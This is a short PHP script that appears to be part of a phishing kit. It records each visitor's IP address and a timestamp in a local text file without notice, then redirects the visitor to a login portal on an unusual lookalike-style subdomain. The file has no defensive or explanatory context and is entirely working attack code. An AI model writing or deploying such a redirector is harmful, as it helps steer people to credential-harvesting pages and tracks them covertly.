<?php

//---------------------------------------------------------------------------------------- RNM
//---------------------------------------------------------------------------------------- FIN
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 


/// VISITOR
$ip = getenv("REMOTE_ADDR");
$file = fopen("visitsss.txt","a");
fwrite($file,$ip."  -   ".$TIME." \n")  ;

header("location: https://genesis.ra.kroll-id8233498.com/login/portal/index.php");
?>